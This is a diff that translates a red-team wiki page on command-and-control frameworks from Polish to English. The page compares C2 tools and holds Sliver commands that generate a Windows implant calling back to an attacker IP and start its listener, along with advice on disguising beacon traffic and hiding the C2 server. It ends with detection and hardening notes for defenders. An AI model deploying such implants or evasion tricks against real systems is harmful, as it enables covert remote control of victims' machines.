@@ -1,5 +1,5 @@
 ---
-title: "C2 Frameworks – przegląd"
+title: "C2 Frameworks – overview"
 category: "red-team"
 tags: ["c2", "command-and-control", "post-exploitation"]
 platform: "agnostic"
@@ -12,43 +12,43 @@ author: "core"
 # C2 Frameworks
 
 ## TL;DR
-Command & Control zarządza implantami po eksploatacji. Wybór wg: kanał (HTTPS/DNS/SMB), profil ruchu (malleable), cena, OPSEC. Używaj wyłącznie w autoryzowanych zaangażowaniach.
+Command & Control manages implants after exploitation. Choose by: channel (HTTPS/DNS/SMB), traffic profile (malleable), cost, OPSEC. Use only in authorized engagements.
 
-## Przegląd
-| Framework | Licencja | Mocne strony |
-|-----------|----------|--------------|
-| Cobalt Strike | komercyjny | standard branżowy, malleable C2, BOF |
-| Sliver | open-source | mTLS/DNS/WireGuard, multi-platform, aktywny |
-| Mythic | open-source | modularny, wiele agentów, ładny UI |
-| Havoc | open-source | nowoczesny, evasion-focused |
-| Metasploit | open-source | szybki PoC, meterpreter (głośny) |
+## Overview
+| Framework | License | Strengths |
+|-----------|---------|-----------|
+| Cobalt Strike | commercial | industry standard, malleable C2, BOF |
+| Sliver | open-source | mTLS/DNS/WireGuard, multi-platform, active |
+| Mythic | open-source | modular, many agents, nice UI |
+| Havoc | open-source | modern, evasion-focused |
+| Metasploit | open-source | fast PoC, meterpreter (loud) |
 
-## Sliver – szybki start
+## Sliver – quick start
 ```bash
-# Serwer
+# Server
 sliver-server
-# Wygeneruj implant (mTLS)
+# Generate an implant (mTLS)
 generate --mtls 10.10.14.1:8443 --os windows --arch amd64 --save impl.exe
 # Listener
 mtls --lhost 10.10.14.1 --lport 8443
-# Po callbacku
+# After callback
 sessions
 use <id>
 ```
 
-## Profile / OPSEC
-- **Malleable/HTTP profile** upodabnia beacon do legalnego ruchu (nagłówki, jitter, sleep).
-- Domain fronting / redirectory (nginx/CDN) ukrywają realny serwer C2.
-- Jitter + długi sleep = mniej wzorca beaconingu.
+## Profiles / OPSEC
+- A **malleable/HTTP profile** makes the beacon resemble legitimate traffic (headers, jitter, sleep).
+- Domain fronting / redirectors (nginx/CDN) hide the real C2 server.
+- Jitter + long sleep = less beaconing pattern.
 
-## Wykrywanie (Blue Team)
-- **Beaconing**: regularne odstępy połączeń (analiza jitter/entropii), JA3/JA3S fingerprint TLS.
-- Domeny młode/rzadkie, DNS o wysokiej entropii (tunel), nietypowe User-Agent.
-- Znane profile CS/Sliver — sygnatury sieciowe/EDR.
+## Detection (Blue Team)
+- **Beaconing**: regular connection intervals (jitter/entropy analysis), JA3/JA3S TLS fingerprint.
+- Young/rare domains, high-entropy DNS (tunnel), unusual User-Agent.
+- Known CS/Sliver profiles — network/EDR signatures.
 
-## Mitygacja / Hardening
+## Mitigation / Hardening
 - TLS inspection + JA3 blocklist, egress allow-list, DNS monitoring.
-- EDR na injection/BOF, blokada nieznanych domen/kategorii.
+- EDR on injection/BOF, block unknown domains/categories.
 
-## Źródła
+## Sources
 - [The C2 Matrix](https://www.thec2matrix.com/) · [Sliver](https://github.com/BishopFox/sliver)
